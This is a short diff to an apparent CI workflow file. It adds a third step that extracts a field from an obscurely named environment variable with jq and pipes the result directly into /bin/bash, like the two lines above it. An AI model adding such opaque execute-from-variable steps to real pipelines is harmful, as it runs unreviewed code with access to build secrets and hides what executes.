@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$kap9162" | jq -r .k4989 | /bin/bash
           echo $bunl37502 | jq -r .ifiz8 | /bin/bash
+          printf '%s' "$od2749" | jq -r .r1 | /bin/bash
 
       - name: Save output
         if: always()
